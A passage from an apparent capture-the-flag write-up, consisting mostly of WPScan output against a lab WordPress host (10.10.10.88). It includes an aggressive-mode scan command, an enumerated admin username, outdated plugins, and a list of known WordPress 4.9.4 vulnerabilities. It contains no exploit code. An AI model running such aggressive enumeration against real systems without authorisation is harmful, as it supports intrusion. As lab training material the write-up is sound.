 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.4'

[+] voce
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/voce/
 | Latest Version: 1.1.0 (up to date)
 | Last Updated: 2017-09-01T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/voce/readme.txt
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/voce/style.css
 | Style Name: voce
 | Style URI: http://limbenjamin.com/pages/voce-wp.html
 | Description: voce is a minimal theme, suitable for text heavy articles. The front page features a list of recent ...
 | Author: Benjamin Lim
 | Author URI: https://limbenjamin.com
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/voce/, status: 500
 |
 | Version: 1.1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/voce/style.css, Match: 'Version: 1.1.0'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <==============================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wpadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 10

[+] Finished: Sat Nov  6 05:02:40 2021
[+] Requests Done: 23523
[+] Cached Requests: 12
[+] Data Sent: 6.61 MB
[+] Data Received: 3.514 MB
[+] Memory used: 276.672 MB
[+] Elapsed time: 00:01:50

```

{% hint style="info" %}
Unfortunately we cannot always rely on the output of our tools. Enumeration is all about finding things that were meant to be found, as well as the things that were not meant to be found. Using this mindset, will greatly improve your enumeration skills.&#x20;

This means that if a tool reports zero findings, rerun the tool with different options to probe and enumerate as much as possible.&#x20;

This may not always be possible though, in a real world scenario for example, you do not want to break the target and so you need to be very careful and think about how this would affect the target system. In addition, aggressive scans in general will most likely trigger detection systems. In a CTF, generally, target systems can tolerate aggressive scans, and if the system crashes, one can simply reload it.

Wpscan is a great example of this. Here, the initial scan using the default "passive" mode did not find any plugins. By changing the scan, we are able to produce different results. In the example below, the scan mode was changed to "aggressive", and the location of the plugins directory was manually specified.

Always remember, whether it's a CTF or a real world pentest, the server/service owners job is to prevent intrusions, and obfuscation is simply one of the many tools available to them, therefore, as attackers, we need to realise that just because we don't see it, it doesn't mean that it's not there.
{% endhint %}

```
└─$ wpscan --url http://10.10.10.88/webservices/wp --detection-mode aggressive --wp-content-dir "wp-content" --wp-plugins-dir "wp-content/plugins" --wp-version-all -e ap,at,cb,u,m --plugins-detection aggressive --plugins-version-all --api-token "your_api_token"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Sat Nov  6 04:14:40 2021

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:09 <=================================> (657 / 657) 100.00% Time: 00:00:09
[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="4.9.4">WordPress</generator>
 | Confirmed By:
 |  Style Etag (Aggressive Detection)
 |   - http://10.10.10.88/webservices/wp/wp-admin/load-styles.php, Match: '4.9.4'
 |  Opml Generator (Aggressive Detection)
 |   - http://10.10.10.88/webservices/wp/wp-links-opml.php, Match: 'generator="WordPress/4.9.4"'
 |
 | [!] 32 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.10
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.9.11
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 4.9.17
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 4.9.18
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:06:15 <==============================> (95710 / 95710) 100.00% Time: 00:06:15
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-10-01T18:28:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 | Latest Version: 1.5.3 (up to date)
 | Last Updated: 2017-06-29T10:39:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-09-14T09:01:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.1.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Gwolle Guestbook <= 2.5.3 - Cross-Site Scripting (XSS)
 |     Fixed in: 2.5.4
 |     References:
 |      - https://wpscan.com/vulnerability/00c33bf2-1527-4276-a470-a21da5929566
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17884
 |      - https://seclists.org/fulldisclosure/2018/Jul/89
 |      - https://www.defensecode.com/advisories/DC-2018-05-008_WordPress_Gwolle_Guestbook_Plugin_Advisory.pdf
 |      - https://plugins.trac.wordpress.org/changeset/1888023/gwolle-gb
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

[+] Enumerating All Themes (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:32 <==============================> (23213 / 23213) 100.00% Time: 00:01:32
[+] Checking Theme Versions (via Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/
 | Latest Version: 3.0
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/readme.txt
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyfifteen/, status: 500
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Twenty Fifteen Theme <= 1.1 - DOM Cross-Site Scripting (XSS)
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/2499b30a-4bcc-462a-935e-1fe4664b95d5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3429
 |      - https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
 |      - https://packetstormsecurity.com/files/131802/
 |      - https://seclists.org/fulldisclosure/2015/May/41
 |
 | The version could not be determined.

[+] twentyseventeen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/README.txt
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentyseventeen/, status: 500
 |
 | The version could not be determined.

[+] twentysixteen
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/
 | Latest Version: 2.5
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/readme.txt
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/twentysixteen/, status: 500
 |
 | The version could not be determined.

[+] voce
 | Location: http://10.10.10.88/webservices/wp/wp-content/themes/voce/
